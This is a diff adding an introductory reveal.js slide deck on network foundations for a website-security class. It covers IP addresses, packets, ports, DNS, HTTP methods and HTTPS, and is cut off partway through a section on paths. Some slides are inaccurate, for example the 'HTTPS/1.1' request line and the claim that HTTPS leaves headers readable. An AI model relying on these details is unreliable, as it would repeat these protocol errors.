@@ -1,0 +1,2256 @@
+<!doctype html>
+<html>
+  <head>
+    <meta charset="utf-8">
+    <title>Website Security - Network Foundations</title>
+
+    <link rel="stylesheet" href="https://unpkg.com/reveal.js/dist/reveal.css">
+    <link rel="stylesheet" href="https://unpkg.com/reveal.js/dist/theme/black.css">
+
+    <style>
+      .reveal .slides section {
+          text-align: left;
+      }
+
+      .reveal h2 {
+          font-size: 1.4em;
+          text-transform: none;
+          font-weight: 600;
+          text-align: left;
+      }
+
+      .reveal h3 {
+          font-size: 1.1em;
+          font-weight: 500;
+      }
+
+      .reveal ul {
+          font-size: 0.85em;
+          line-height: 1.4em;
+      }
+
+      .reveal pre {
+          font-size: 0.7em;
+      }
+    </style>
+  </head>
+
+  <body>
+
+    <div class="reveal">
+      <div class="slides">
+
+        <!-- ===================== TITLE ===================== -->
+
+        <section>
+          <h2>Website Security</h2>
+        </section>
+
+        <section>
+          <h2>ARPANET</h2>
+          <ul>
+            <li>DoD ARPA
+              <ul>
+                <li>Advanced Research Projects Agency</li>
+              </ul>
+            </li>
+            <li>Funded the first internet: ARPANET
+              <ul>
+                <li>1969</li>
+              </ul>
+            </li>
+            <li>Ran over telephone cables</li>
+          </ul>
+        </section>
+
+        <section>
+          <img src="images/IMP.jpg"
+               alt="ARPANET IMP"
+               style="display: block; margin: 0 auto; max-width: 90%; max-height: 80vh;">
+        </section>
+
+        <section>
+          <h2>First Message Sent</h2>
+          <ul>
+            <li>Connected computers from Stanford and UCLA</li>
+            <li>The First message sent was "LO"
+              <ul>
+                <li class="fragment">Stanford sent "LOGIN"</li>
+                <li class="fragment">System crashed after "LO"</li>
+              </ul>
+            </li>
+          </ul>
+        </section>
+
+        
+        <section>
+          <h2>Modems</h2>
+          <ul>
+            <li>Computers expect a steam of 1s and 0s</li>
+            <li>Telephone wires sent an electrical signal representing voice</li>
+            <li class="fragment">Modems turn non-binary signal into a binary signal</li>
+          </ul>
+        </section>
+
+        <section>
+          <h2>Remember This?</h2>
+          <iframe
+            width="960"
+            height="540"
+            src="https://www.youtube.com/watch?v=QDS4B0mM-ew"
+            title="Beautiful Music"
+            allowfullscreen>
+          </iframe>
+        </section>
+
+        <section>
+          <h2>Dial-Up Sound</h2>
+          <ul>
+            <li>Sound produced during "the handshake"</li>
+            <li class="fragment">Two computers are sending signals</li>
+            <li class="fragment">Screeching is the sound of Dial-up modem calling ISP</li>
+            <li class="fragment">After connection, Dial-up modem mutes speakers</li>
+            <li class="fragment">Otherwise it would just keep making that sound :)</li>
+          </ul>
+        </section>
+
+        <section>
+          <h2>Computers Talking</h2>
+          <ul>
+            <li>We connect to ISP computer
+              <ul>
+                <li>Which connects us to another computer</li>
+              </ul>
+            </li>
+            <li class="fragment">The internet is just computers talking</li>
+          </ul>
+        </section>
+
+        <section>
+          <h2>Modern Internet</h2>
+          <ul>
+            <li>No longer telephone wires</li>
+            <li class="fragment">Runs over Coax and Fiber cables</li>
+            <li class="fragment">Coax is slower and older</li>
+            <li class="fragment">Fiber is newer and faster</li>
+          </ul>
+        </section>
+
+        <section>
+          <table>
+            <tbody>
+              <tr>
+                <td>Dial-up</td>
+                <td>56 Kbps</td>
+              </tr>
+              <tr>
+                <td>Coax</td>
+                <td>1 Gbps</td>
+              </tr>
+              <tr>
+                <td>Fiber Optic</td>
+                <td>10-50+ Gbps</td>
+              </tr>
+            </tbody>
+          </table>
+        </section>
+
+
+        <section>
+          <h2>Networks</h2>
+        </section>
+
+        <section>
+          <h2>Networks</h2>
+          <ul>
+            <li>Computers are grouped into pods called networks</li>
+            <li>Computers connected via ethernet form a network</li>
+            <li>Home networks are usually linked via a router</li>
+          </ul>
+        </section>
+
+        <section>
+
+          <svg viewBox="0 0 800 500" style="width:100%; height:auto;">
+
+            ```
+            <!-- Connections -->
+            <line x1="400" y1="250" x2="400" y2="120"
+                  stroke="#888" stroke-width="4"/>
+
+            <line x1="400" y1="250" x2="220" y2="380"
+                  stroke="#888" stroke-width="4"/>
+
+            <line x1="400" y1="250" x2="580" y2="380"
+                  stroke="#888" stroke-width="4"/>
+
+            <!-- Router -->
+            <rect x="340" y="210" width="120" height="80"
+                  rx="10"
+                  fill="#3366cc"/>
+
+            <text x="400" y="258"
+                  text-anchor="middle"
+                  fill="white"
+                  font-size="24">
+              Router
+            </text>
+
+            <!-- Computer A -->
+            <rect x="330" y="40" width="140" height="60"
+                  rx="5"
+                  fill="#444"/>
+
+            <text x="400" y="78"
+                  text-anchor="middle"
+                  fill="white"
+                  font-size="20">
+              Computer A
+            </text>
+
+            <!-- Computer B -->
+            <rect x="120" y="390" width="140" height="60"
+                  rx="5"
+                  fill="#444"/>
+
+            <text x="190" y="428"
+                  text-anchor="middle"
+                  fill="white"
+                  font-size="20">
+              Computer B
+            </text>
+
+            <!-- Computer C -->
+            <rect x="540" y="390" width="140" height="60"
+                  rx="5"
+                  fill="#444"/>
+
+            <text x="610" y="428"
+                  text-anchor="middle"
+                  fill="white"
+                  font-size="20">
+              Computer C
+            </text>
+
+            <!-- Packet A -->
+            <circle r="8" fill="#00ff88">
+              <animateMotion
+                dur="3s"
+                repeatCount="indefinite"
+                path="M400,120 L400,250 L580,380" />
+            </circle>
+
+            <!-- Packet B -->
+            <circle r="8" fill="#ffcc00">
+              <animateMotion
+                dur="4s"
+                repeatCount="indefinite"
+                path="M220,380 L400,250 L400,120" />
+            </circle>
+
+            <!-- Packet C -->
+            <circle r="8" fill="#ff6666">
+              <animateMotion
+                dur="5s"
+                repeatCount="indefinite"
+                path="M580,380 L400,250 L220,380" />
+            </circle>
+            ```
+
+          </svg>
+        </section>
+
+        <section>
+          <svg viewBox="0 0 800 500" style="width:100%; height:auto;">
+
+            <!-- links -->
+            <line x1="400" y1="250" x2="400" y2="120" stroke="#888" stroke-width="4"/>
+            <line x1="400" y1="250" x2="220" y2="380" stroke="#888" stroke-width="4"/>
+            <line x1="400" y1="250" x2="580" y2="380" stroke="#888" stroke-width="4"/>
+
+            <!-- router -->
+            <rect x="340" y="210" width="120" height="80" rx="10" fill="#3366cc"/>
+            <text x="400" y="258" text-anchor="middle" fill="white" font-size="24">Router</text>
+
+            <!-- computers -->
+            <rect x="330" y="40" width="140" height="60" rx="5" fill="#444"/>
+            <text x="400" y="78" text-anchor="middle" fill="white" font-size="20">Computer A</text>
+
+            <rect x="120" y="390" width="140" height="60" rx="5" fill="#444"/>
+            <text x="190" y="428" text-anchor="middle" fill="white" font-size="20">Computer B</text>
+
+            <rect x="540" y="390" width="140" height="60" rx="5" fill="#444"/>
+            <text x="610" y="428" text-anchor="middle" fill="white" font-size="20">Computer C</text>
+
+            <!-- static packet at Computer A -->
+            <circle cx="400" cy="95" r="10" fill="#00ff88"/>
+
+          </svg>
+        </section>
+
+        <section>
+          <svg viewBox="0 0 800 500" style="width:100%; height:auto;">
+
+            <!-- connections -->
+            <line x1="400" y1="250" x2="400" y2="120" stroke="#888" stroke-width="4"/>
+            <line x1="400" y1="250" x2="220" y2="380" stroke="#888" stroke-width="4"/>
+            <line x1="400" y1="250" x2="580" y2="380" stroke="#888" stroke-width="4"/>
+
+            <!-- router -->
+            <rect x="340" y="210" width="120" height="80" rx="10" fill="#3366cc"/>
+            <text x="400" y="258" text-anchor="middle" fill="white" font-size="24">Router</text>
+
+            <!-- computers -->
+            <rect x="330" y="40" width="140" height="60" rx="5" fill="#444"/>
+            <text x="400" y="78" text-anchor="middle" fill="white" font-size="20">Computer A</text>
+
+            <rect x="120" y="390" width="140" height="60" rx="5" fill="#444"/>
+            <text x="190" y="428" text-anchor="middle" fill="white" font-size="20">Computer B</text>
+
+            <rect x="540" y="390" width="140" height="60" rx="5" fill="#444"/>
+            <text x="610" y="428" text-anchor="middle" fill="white" font-size="20">Computer C</text>
+
+            <!-- packet -->
+            <circle class="packetone" cx="400" cy="95" r="10"/>
+
+          </svg>
+
+          <style>
+            .packetone {
+                fill: #00ff88;
+                animation: packetFlow1 5s infinite;
+            }
+
+            @keyframes packetFlow1 {
+
+                /* start at Computer A */
+                0% {
+                    transform: translate(0px, 0px);
+                    fill: #00ff88;
+                }
+
+                /* travel to router */
+                30% {
+                    transform: translate(0px, 155px);
+                    fill: #00ff88;
+                }
+
+                /* arrive + turn red */
+                35% {
+                    transform: translate(0px, 155px);
+                    fill: #ff4444;
+                }
+
+                /* stop at router */
+                100% {
+                    transform: translate(0px, 155px);
+                    fill: #ff4444;
+                }
+            }
+          </style>
+        </section>
+
+        <section>
+
+          <div style="display:flex; justify-content:space-between; align-items:center; gap:40px;">
+
+            <!-- right: text -->
+            <div style="flex:1; color:white; font-size:34px;">
+              Where does this message go?
+            </div>
+
+            <!-- left: image -->
+            <div style="flex:1; display:flex; justify-content:center;">
+              <img
+                src="images/router.png"
+                style="max-width:300px; height:auto;"
+                />
+            </div>
+          </div>
+        </section>
+
+        <section>
+          <h2>IP Addresses</h2>
+          <ul>
+            <li>Every device on a network needs an address</li>
+            <li class="fragment">Just like houses have street addresses</li>
+            <li class="fragment">Computers need addresses so data knows where to go</li>
+            <li class="fragment">These addresses are called IP addresses</li>
+          </ul>
+        </section>
+
+        <section>
+          <h2>Example IP Address</h2>
+          <ul>
+            <li>192.168.1.42</li>
+            <li class="fragment">Four numbers separated by dots</li>
+            <li class="fragment">Each device gets a unique address on the network</li>
+            <li class="fragment">Without an address, computers wouldn&apos;t know where to send information</li>
+          </ul>
+          <p class="fragment">Note: This is IPv4. IPv6 is the same idea (an address), but more than 4 numbers</p>
+        </section>
+
+        <section>
+          <h2>Packets</h2>
+          <ul>
+            <li>Data sent is contained inside of packets</li>
+            <li>Packets contain the 1s and 0s of the message</li>
+            <li class="fragment">Packets also contain a "header"
+              <ul>
+                <li class="fragment">The header holds the IP address</li>
+              </ul>
+            </li>
+          </ul>
+        </section>
+
+        <section>
+          <h2>Packet structure</h2>
+
+          <pre style="font-size:0.85em; background:#111; padding:15px; color:#ddd;">
+            [ HEADER ]
+            Source IP:      192.168.1.2
+            Destination IP: 192.168.1.1
+
+            [ DATA ]
+            "Hello world"
+          </pre>
+          <p class="fragment">This header is not complete. We will add more later</p>
+        </section>
+
+        <section>
+          <h2>What happens to a packet?</h2>
+
+          <div style="display:flex; gap:40px; align-items:center;">
+
+            <div style="flex:1; font-size:26px; line-height:1.4;">
+
+              <p class="fragment">1. Computer A creates a packet</p>
+              <p class="fragment">2. It includes a destination IP (Computer C)</p>
+              <p class="fragment">3. The router receives the packet</p>
+              <p class="fragment">4. The router reads the header</p>
+              <p class="fragment">5. The router forwards it to Computer C</p>
+
+            </div>
+
+            <div style="flex:1;">
+
+              <svg viewBox="0 0 400 300" style="width:100%; height:auto;">
+
+                <!-- Computer A -->
+                <rect x="30" y="40" width="100" height="40" fill="#444" rx="5"/>
+                <text x="80" y="65" text-anchor="middle" fill="white" font-size="12">A</text>
+
+                <!-- Router -->
+                <rect x="160" y="120" width="80" height="50" fill="#3366cc" rx="8"/>
+                <text x="200" y="150" text-anchor="middle" fill="white" font-size="14">Router</text>
+
+                <!-- Computer C -->
+                <rect x="270" y="40" width="100" height="40" fill="#444" rx="5"/>
+                <text x="320" y="65" text-anchor="middle" fill="white" font-size="12">C</text>
+
+                <!-- Packet (animated) -->
+                <g class="packettwo" transform="translate(80,90)">
+                  <circle cx="0" cy="0" r="6"></circle>
+                </g>
+
+              </svg>
+
+              <style>
+                .packettwo {
+                    fill: #00ff88;
+                    transform-box: fill-box;
+                    transform-origin: center;
+                    animation: route2 6s infinite;
+                }
+
+                @keyframes route2 {
+
+                    /* at Computer A */
+                    0% {
+                        transform: translate(80px, 90px);
+                        fill: #00ff88;
+                    }
+
+                    /* move to router */
+                    35% {
+                        transform: translate(200px, 140px);
+                        fill: #00ff88;
+                    }
+
+                    /* router reads packet */
+                    50% {
+                        transform: translate(200px, 140px);
+                        fill: #ffcc00;
+                    }
+
+                    /* forward to C */
+                    80% {
+                        transform: translate(320px, 90px);
+                        fill: #00ff88;
+                    }
+
+                    /* settle at C */
+                    100% {
+                        transform: translate(320px, 90px);
+                        fill: #00ff00;
+                    }
+                }
+              </style>
+
+            </div>
+
+          </div>
+        </section>
+
+        <section>
+          <h2>Computer C</h2>
+          <ul>
+            <li>Lets assume:
+              <ul>
+                <li>Computer C has Facebook open</li> 
+                <li>Computer C also has an online video game playing</li> 
+              </ul>
+            <li>Who does the packet belong to?</li> 
+            <li>Facebook or the Video Game</li> 
+            </li> 
+          </ul>
+        </section>
+
+        <section>
+          <h2>Ports</h2>
+          <ul>
+            <li>Computers don&apos;t accept any ole Packet that shows up</li> 
+            <li class="fragment">Computers expose "services" over ports</li> 
+            <li class="fragment">Computers usually carry 65535 ports</li> 
+            <li class="fragment">Services "claim" a port number</li> 
+          </ul>
+        </section>
+
+        <section>
+          <h2>Computer C</h2>
+          <ul>
+            <li>Lets assume:
+              <ul>
+                <li>Computer C has Facebook open</li> 
+                <li>Computer C also has an online video game playing</li> 
+              </ul>
+            </li> 
+            <li>Who does the packet belong to?
+              <ul>
+                <li>Facebook or the Video Game</li> 
+              </ul>
+            </li> 
+          </ul>
+          <p class="fragment"><strong>Answer:</strong> Packet Header contains the port number</p>
+        </section>
+
+        <section>
+          <h2>Packet structure</h2>
+
+          <pre style="font-size:0.85em; background:#111; padding:15px; color:#ddd;">
+            [ HEADER ]
+            Source IP:      192.168.1.2
+            Destination IP: 192.168.1.1
+            Source Port:           5565
+            Destination Port:      4444
+
+            [ DATA ]
+            "New Facebook Message: Call Grandma"
+          </pre>
+        </section>
+
+        <section>
+          <h2>What happens to a packet?</h2>
+
+          <div style="display:flex; gap:40px; align-items:center;">
+
+            <div style="flex:1; font-size:26px; line-height:1.4;">
+
+              <p>1. Computer A creates a packet</p>
+              <p>2. It includes a destination IP (Computer C)</p>
+              <p>3. The router receives the packet</p>
+              <p>4. The router reads the header</p>
+              <p>5. The router forwards it to Computer C</p>
+              <p class="fragment">6. Computer C reads the port number</p>
+              <p class="fragment">7. Packet is passed to Facebook</p>
+
+            </div>
+
+            <div style="flex:1;">
+
+              <svg viewBox="0 0 400 300" style="width:100%; height:auto;">
+
+                <!-- Computer A -->
+                <rect x="30" y="40" width="100" height="40" fill="#444" rx="5"/>
+                <text x="80" y="65" text-anchor="middle" fill="white" font-size="12">A</text>
+
+                <!-- Router -->
+                <rect x="160" y="120" width="80" height="50" fill="#3366cc" rx="8"/>
+                <text x="200" y="150" text-anchor="middle" fill="white" font-size="14">Router</text>
+
+                <!-- Computer C -->
+                <rect x="270" y="40" width="100" height="40" fill="#444" rx="5"/>
+                <text x="320" y="65" text-anchor="middle" fill="white" font-size="12">C</text>
+
+                <!-- Packet (animated) -->
+                <g class="packettwo" transform="translate(80,90)">
+                  <circle cx="0" cy="0" r="6"></circle>
+                </g>
+
+              </svg>
+
+              <style>
+                .packettwo {
+                    fill: #00ff88;
+                    transform-box: fill-box;
+                    transform-origin: center;
+                    animation: route2 6s infinite;
+                }
+
+                @keyframes route2 {
+
+                    /* at Computer A */
+                    0% {
+                        transform: translate(80px, 90px);
+                        fill: #00ff88;
+                    }
+
+                    /* move to router */
+                    35% {
+                        transform: translate(200px, 140px);
+                        fill: #00ff88;
+                    }
+
+                    /* router reads packet */
+                    50% {
+                        transform: translate(200px, 140px);
+                        fill: #ffcc00;
+                    }
+
+                    /* forward to C */
+                    80% {
+                        transform: translate(320px, 90px);
+                        fill: #00ff88;
+                    }
+
+                    /* settle at C */
+                    100% {
+                        transform: translate(320px, 90px);
+                        fill: #00ff00;
+                    }
+                }
+              </style>
+
+            </div>
+
+          </div>
+        </section>
+
+        <section>
+          <h2>Local Networks vs Internet</h2>
+          <ul>
+            <li>Local Area Network (LAN)
+              <ul>
+                <li>This is what we have seen thus far</li>
+              </ul>
+            </li> 
+            <li class="fragment">Internet is exactly the same
+            </li>
+          </ul>
+        </section>
+
+        <section>
+          <h2>Public IP</h2>
+          <ul>
+            <li class="fragment">ISP&apos;s don&apos;t assign an IP to every computer in your house</li> 
+            <li class="fragment">They assign an IP to just the router/modem</li> 
+            <li class="fragment">This is the networks <strong>Public IP</strong></li> 
+          </ul>
+        </section>
+
+
+        <section>
+          <svg viewBox="0 0 800 500" style="width:100%; height:auto;">
+
+            <!-- Internet -->
+            <ellipse cx="400" cy="70" rx="120" ry="50" fill="#666"/>
+            <text x="400" y="82"
+                  text-anchor="middle"
+                  fill="white"
+                  font-size="28">
+              Internet
+            </text>
+
+            <!-- Router -->
+            <rect x="340" y="190"
+                  width="120"
+                  height="80"
+                  rx="10"
+                  fill="#3366cc"/>
+
+            <text x="400" y="238"
+                  text-anchor="middle"
+                  fill="white"
+                  font-size="24">
+              Router
+            </text>
+
+            <!-- Links -->
+            <line x1="400" y1="120"
+                  x2="400" y2="190"
+                  stroke="#888"
+                  stroke-width="4"/>
+
+            <line x1="400" y1="270"
+                  x2="200" y2="400"
+                  stroke="#888"
+                  stroke-width="4"/>
+
+            <line x1="400" y1="270"
+                  x2="600" y2="400"
+                  stroke="#888"
+                  stroke-width="4"/>
+
+            <!-- Computer A -->
+            <rect x="120" y="400"
+                  width="160"
+                  height="60"
+                  rx="5"
+                  fill="#444"/>
+
+            <text x="200" y="438"
+                  text-anchor="middle"
+                  fill="white"
+                  font-size="20">
+              Computer A
+            </text>
+
+            <!-- Computer B -->
+            <rect x="520" y="400"
+                  width="160"
+                  height="60"
+                  rx="5"
+                  fill="#444"/>
+
+            <text x="600" y="438"
+                  text-anchor="middle"
+                  fill="white"
+                  font-size="20">
+              Computer B
+            </text>
+
+            <!-- Packet -->
+            <circle class="internetpacket"
+                    cx="400"
+                    cy="120"
+                    r="10"/>
+
+          </svg>
+
+          <style>
+            .internetpacket {
+                fill: #00ff88;
+                animation: internetRoute 6s infinite;
+            }
+
+            @keyframes internetRoute {
+
+                /* Leaving Internet */
+                0% {
+                    transform: translate(0px, 0px);
+                    fill: #00ff88;
+                }
+
+                /* Arrive at router */
+                35% {
+                    transform: translate(0px, 154px);
+                    fill: #00ff88;
+                }
+
+                /* Router inspecting packet */
+                50% {
+                    transform: translate(0px, 154px);
+                    fill: #ffcc00;
+                }
+
+                /* Forward to Computer B */
+                85% {
+                    transform: translate(200px, 290px);
+                    fill: #00ff88;
+                }
+
+                /* Delivered */
+                100% {
+                    transform: translate(200px, 290px);
+                    fill: #00ff00;
+                }
+            }
+
+          </style>
+
+        </section>
+        
+
+        <section>
+          <h2>Facebook</h2>
+          <ul>
+            <li class="fragment">Facebook has a router, just like you!</li> 
+            <li class="fragment">To connect to facebook, we connect to their network</li> 
+            <li class="fragment">We just need <strong>their</strong> public IP</li> 
+          </ul>
+        </section>
+        
+        <section>
+          <h2>Hands-on: Finding your network address</h2>
+        </section>
+
+        <section>
+          <h3>On Linux</h3>
+          <pre style="font-size:0.8em; background:#111; padding:15px; color:#ddd;">
+            $ ip a
+          </pre>
+          <h3>On MacOS</h3>
+          <pre style="font-size:0.8em; background:#111; padding:15px; color:#ddd;">
+            $ ifconfig | grep inet
+          </pre>
+
+          <ul>
+            <li>Shows network interfaces</li>
+            <li>Look for inet</li>
+          </ul>
+        </section>
+
+        <section>
+          <h2>Hands-on: Finding CCTs Public IP</h2>
+        </section>
+
+        <section>
+          <pre style="font-size:0.8em; background:#111; padding:15px; color:#ddd;">
+            $ curl ifconfig.me
+          </pre>
+        </section>
+
+
+
+
+
+        <!-- Insert slides about Public IP -->
+
+        <section>
+          <h2>Websites</h2>
+        </section>
+
+        <section>
+          <h2>Websites</h2>
+          <ul>
+            <li>The internet is just computers talking to each other</li>
+            <li>Websites are no different</li>
+            <li>Special kind of Packet: HTTP and HTTPS</li>
+          </ul>
+        </section>
+
+        <!-- ===================== HTTP ===================== -->
+
+        <section>
+          <h2>HTTP</h2>
+          <ul>
+            <li>HyperText Transfer Protocol</li>
+            <li class="fragment">It is a set of rules for how computers ask for and send files</li>
+            <li class="fragment">Your browser understands HTTP</li>
+            <li class="fragment">Web servers understand HTTP</li>
+          </ul>
+        </section>
+
+        <section>
+          <h2>A Conversation</h2>
+          <ul>
+            <li>HTTP is a back-and-forth between two computers</li>
+            <li class="fragment">Your computer: "Can I have that file?"</li>
+            <li class="fragment">The server: "Sure, here it is"</li>
+            <li class="fragment">Or: "Sorry, I can&apos;t find that"</li>
+          </ul>
+        </section>
+
+        <section>
+          <h2>HTTP Methods</h2>
+          <ul>
+            <li>HTTP requests come in different types called "methods"</li>
+            <li class="fragment">Each method describes an action</li>
+            <li class="fragment">The most common are <strong>GET</strong> and <strong>POST</strong></li>
+          </ul>
+        </section>
+
+        <section>
+          <h2>GET</h2>
+          <ul>
+            <li>GET just means: "give me that file"</li>
+            <li class="fragment">When you type a URL into your browser, it sends a GET request</li>
+            <li class="fragment">The server finds the file and sends it back</li>
+            <li class="fragment">Thats it  GET <em>gets</em> things</li>
+          </ul>
+        </section>
+
+        <section>
+          <h2>What does a GET request look like?</h2>
+          <pre style="font-size:0.85em; background:#111; padding:15px; color:#ddd;">
+            GET /index.html HTTP/1.1
+            Host: facebook.com
+          </pre>
+          <ul>
+            <li class="fragment">"GET" — the method</li>
+            <li class="fragment">"/index.html" — the file we want</li>
+            <li class="fragment">"Host" — which server to ask</li>
+          </ul>
+        </section>
+
+        <section>
+          <pre style="font-size:0.85em; background:#111; padding:15px; color:#ddd;">
+            [ HEADER ]
+            Source IP:        192.168.1.42
+            Destination IP:   ?
+            Source Port:      58421
+            Destination Port: 80
+
+            [ HTTP ]
+            GET /index.html HTTP/1.1
+            Host: facebook.com
+          </pre>
+          <ul>
+            <li class="fragment">HTTP is extra header information</li>
+            <li class="fragment">Browser adds the HTTP part</li>
+          </ul>
+        </section>
+
+        <section>
+          <h2>Hold on...</h2>
+          <pre style="font-size:0.85em; background:#111; padding:15px; color:#ddd;">
+            [ HEADER ]
+            Source IP:        192.168.1.42
+            <span style="color:#ff4444; font-weight:bold;">Destination IP:   ?</span>
+            Source Port:      58421
+            Destination Port: 80
+
+            [ HTTP ]
+            GET /index.html HTTP/1.1
+            Host: facebook.com
+          </pre>
+          <p style="color:#ff4444;">How does our computer know where to send this?</p>
+        </section>
+
+
+        <section>
+          <h2>What is Facebook's Public IP?</h2>
+          <ul>
+            <li class="fragment">To send any kind of packet to Facebook, we need their Public IP</li>
+          </ul>
+        </section>
+
+
+        <section>
+          <h2>DNS</h2>
+          <ul>
+            <li>Domain Name System</li>
+            <li>Trusted 3rd Party that knows Facebooks Public IP</li>
+            <li class="fragment">Websites have to pay these 3rd Parties</li>
+            <li class="fragment">3rd Party will then "resolve" Domain Name -> IP Address</li>
+          </ul>
+        </section>
+
+
+        <section>
+          <h2>Example</h2>
+          <ul>
+            <li>If we want to communicate with Facebook:
+              <ul>
+                <li class="fragment">We first ask a trusted DNS provider
+                  <ul>
+                    <li class="fragment">Do you know facebook.com?</li>
+                  </ul>
+                </li>
+                <li class="fragment">The DNS will respond with Facebooks Public IP</li>
+                <li class="fragment">Computer <strong>REPLACES</strong> facebook.com with IP address</li>
+                <li class="fragment">Router can now forward packet to IP address</li>
+              </ul>
+            </li>
+          </ul>
+        </section>
+
+
+
+        <section>
+          <svg viewBox="0 0 1200 600" style="width:100%;height:auto;">
+            <defs>
+              <marker id="arrow" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse">
+                <path d="M2 1L8 5L2 9" fill="none" stroke="context-stroke" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
+              </marker>
+            </defs>
+
+            <!-- Computers -->
+            <rect x="80" y="120" width="160" height="70" rx="5" fill="#444"/>
+            <text x="160" y="155" text-anchor="middle" fill="white" font-size="18" dominant-baseline="central">Computer A</text>
+            <rect x="80" y="320" width="160" height="70" rx="5" fill="#444"/>
+            <text x="160" y="355" text-anchor="middle" fill="white" font-size="18" dominant-baseline="central">Computer B</text>
+
+            <!-- Router -->
+            <rect x="340" y="220" width="160" height="90" rx="10" fill="#3366cc"/>
+            <text x="420" y="265" text-anchor="middle" fill="white" font-size="20" dominant-baseline="central">Router</text>
+
+            <!-- ISP -->
+            <rect x="650" y="220" width="180" height="90" rx="10" fill="#666"/>
+            <text x="740" y="265" text-anchor="middle" fill="white" font-size="20" dominant-baseline="central">ISP</text>
+
+            <!-- Facebook -->
+            <rect x="980" y="220" width="180" height="90" rx="10" fill="#1877F2"/>
+            <text x="1070" y="265" text-anchor="middle" fill="white" font-size="20" dominant-baseline="central">Facebook</text>
+
+            <!-- DNS -->
+            <rect x="340" y="40" width="180" height="80" rx="10" fill="#cc9933"/>
+            <text x="430" y="80" text-anchor="middle" fill="white" font-size="18" dominant-baseline="central">DNS Server</text>
+
+            <!-- Wires -->
+            <line x1="240" y1="155" x2="340" y2="155" stroke="#888" stroke-width="4"/>
+            <line x1="340" y1="155" x2="340" y2="220" stroke="#888" stroke-width="4"/>
+            <line x1="240" y1="355" x2="340" y2="355" stroke="#888" stroke-width="4"/>
+            <line x1="340" y1="355" x2="340" y2="310" stroke="#888" stroke-width="4"/>
+            <line x1="500" y1="265" x2="650" y2="265" stroke="#888" stroke-width="4"/>
+            <line x1="830" y1="265" x2="980" y2="265" stroke="#888" stroke-width="4"/>
+            <line x1="420" y1="220" x2="420" y2="120" stroke="#888" stroke-width="4"/>
+
+            <!-- Packet path: A → Router → DNS → Router → A → Router → ISP → Facebook -->
+            <path id="packetPath"
+                  d="M 240 155
+                     L 340 155
+                     L 340 230
+                     L 420 230
+                     L 420 120
+                     L 420 230
+                     L 340 230
+                     L 340 155
+                     L 240 155
+                     L 340 155
+                     L 340 230
+                     L 500 265
+                     L 650 265
+                     L 830 265
+                     L 980 265"
+                  fill="none" stroke="none"/>
+
+            <!-- Packet -->
+            <circle r="12" fill="#00ff88" stroke="#00aa55" stroke-width="2">
+              <animateMotion dur="7s" repeatCount="indefinite" calcMode="linear">
+                <mpath href="#packetPath"/>
+              </animateMotion>
+            </circle>
+          </svg>
+        </section>
+
+<!-- Note: pre needs to be replaced  -->
+
+        <section>
+          <h2>Facebook Responds</h2>
+          <pre style="font-size:0.85em; background:#111; padding:15px; color:#ddd;">
+            HTTP/1.1 200 OK
+
+            &lt;html&gt;
+            &lt;body&gt;New Message: Call Grandma&lt;/body&gt;
+            &lt;/html&gt;
+          </pre>
+          <ul>
+            <li class="fragment">200 means "everything is fine, here's your file"</li>
+            <li class="fragment">404 means "I couldn't find that file"</li>
+          </ul>
+        </section>
+
+        <section>
+          <h2>POST</h2>
+          <ul>
+            <li>POST means: "here is some data, do something with it"</li>
+            <li class="fragment">When you submit a login form, your browser sends a POST</li>
+            <li class="fragment">When you post a tweet, that's a POST</li>
+            <li class="fragment">Unlike GET, POST carries data in the <strong>body</strong> of the request</li>
+          </ul>
+        </section>
+
+        <section>
+          <h2>What does a POST request look like?</h2>
+          <pre style="font-size:0.85em; background:#111; padding:15px; color:#ddd;">
+            POST /login HTTP/1.1
+            Host: facebook.com
+
+            email=alice@example.com
+            password=hunter2
+          </pre>
+          <ul>
+            <li class="fragment">"POST" — the method</li>
+            <li class="fragment">"/login" — where to send it</li>
+            <li class="fragment">The blank line separates the headers from the <strong>body</strong></li>
+            <li class="fragment">The body carries your actual data</li>
+          </ul>
+        </section>
+
+        <section>
+          <h2>GET vs POST</h2>
+          <table>
+            <tbody>
+              <tr>
+                <td></td>
+                <td><strong>GET</strong></td>
+                <td><strong>POST</strong></td>
+              </tr>
+              <tr>
+                <td>Purpose</td>
+                <td>Retrieve something</td>
+                <td>Send something</td>
+              </tr>
+              <tr>
+                <td>Data</td>
+                <td>Sent to us</td>
+                <td>Sent to them</td>
+              </tr>
+              <tr>
+                <td>Example</td>
+                <td>Loading a page</td>
+                <td>Submitting a form</td>
+              </tr>
+            </tbody>
+          </table>
+          <p class="fragment">There are other methods too — PUT, DELETE, PATCH — but GET and POST cover 90% of what you'll see</p>
+        </section>
+
+        <section>
+          <h2>HTTPS</h2>
+          <ul>
+            <li>HyperText Transfer Protocol <strong>Secure</strong></li>
+            <li class="fragment">The same as HTTP — but the data is <strong>encrypted</strong></li>
+            <li class="fragment">Nobody in the middle can read it</li>
+          </ul>
+        </section>
+
+        <section>
+          <h2>HTTP vs HTTPS</h2>
+          <div style="display:flex; gap:20px;">
+            <div style="flex:1;">
+              <p style="color:#ff4444; margin:0 0 8px 0;">❌ HTTP — Plain Text</p>
+              <pre style="font-size:0.72em; background:#111; padding:15px; color:#ddd;">
+                POST /login HTTP/1.1
+                Host: facebook.com
+
+                email=alice@example.com
+                password=hunter2
+              </pre>
+              <p style="font-size:0.75em; color:#ff4444;">Anyone between you and Facebook can read this</p>
+            </div>
+          </div>
+        </section>
+
+        <section>
+          <h2>HTTP vs HTTPS</h2>
+          <div style="display:flex; gap:20px;">
+            <div style="flex:1;">
+              <p style="color:#66ff66; margin:0 0 8px 0;">✅ HTTPS — Encrypted</p>
+              <pre style="font-size:0.72em; background:#111; padding:15px; color:#ddd;">
+                POST /login HTTPS/1.1
+                Host: facebook.com
+
+                U2FsdGVkX1+k9Xz3mQpL8v
+                Yw7TnR2cHs0dKjNqBe4iAo
+                Fp6WtEGlZm1rCuVhXyDsIb
+                Mn3oPQaKwJgUeRfT5vYcHd
+              </pre>
+              <p style="font-size:0.75em; color:#66ff66;">Looks like gibberish to anyone intercepting it</p>
+            </div>
+          </div>
+        </section>
+
+
+        <section>
+          <h2>Paths</h2>
+        </section>
+
+        <section>
+          <h2>Paths</h2>
+          <ul>
+            <li>Remember the GET request?</li>
+          </ul>
+          <pre style="font-size:0.85em; background:#111; padding:15px; color:#ddd;">
+            GET /index.html HTTP/1.1
+            Host: facebook.com
+          </pre>
+          <ul>
+            <li class="fragment">The <strong>/index.html</strong> part is called the <strong>path</strong></li>
